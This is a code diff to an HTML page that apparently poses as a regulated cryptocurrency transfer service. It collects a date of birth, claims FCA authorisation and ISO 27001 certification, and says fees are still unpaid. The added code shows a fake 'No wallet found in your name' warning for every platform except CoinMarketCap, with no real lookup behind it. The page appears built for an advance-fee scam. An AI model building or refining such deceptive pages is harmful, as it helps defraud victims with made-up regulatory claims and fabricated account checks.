@@ -44,7 +44,7 @@
         button:hover {
             background: #00b89c;
         }
-        .popup {
+        .popup, .warning-popup {
             display: none;
             position: fixed;
             top: 50%;
@@ -76,7 +76,7 @@
         <input type="date" id="dob">
         
         <label for="platform">Transferring From:</label>
-        <select id="platform">
+        <select id="platform" onchange="checkPlatform()">
             <option value="CoinMarketCap">CoinMarketCap</option>
             <option value="Coinbase">Coinbase</option>
             <option value="Binance">Binance</option>
@@ -101,6 +101,11 @@
         <p style="font-size: 14px; color: yellow;">Fees are not yet paid to complete the transaction.</p>
     </div>
     
+    <div class="warning-popup" id="warningPopup">
+        <p style="color: yellow;">Warning: No wallet found in your name for the selected platform. Only CoinMarketCap has a valid wallet.</p>
+        <button onclick="closeWarningPopup()">OK</button>
+    </div>
+    
     <div class="footer">
         <p>Authorized by the Financial Conduct Authority (FCA)</p>
         <p>Secured by Blockchain Technology | ISO 27001 Certified</p>
@@ -120,6 +125,15 @@
         }
         function closePopup() {
             document.getElementById("popup").style.display = "none";
+        }
+        function checkPlatform() {
+            let platform = document.getElementById("platform").value;
+            if (platform !== "CoinMarketCap") {
+                document.getElementById("warningPopup").style.display = "block";
+            }
+        }
+        function closeWarningPopup() {
+            document.getElementById("warningPopup").style.display = "none";
         }
     </script>
 </body>
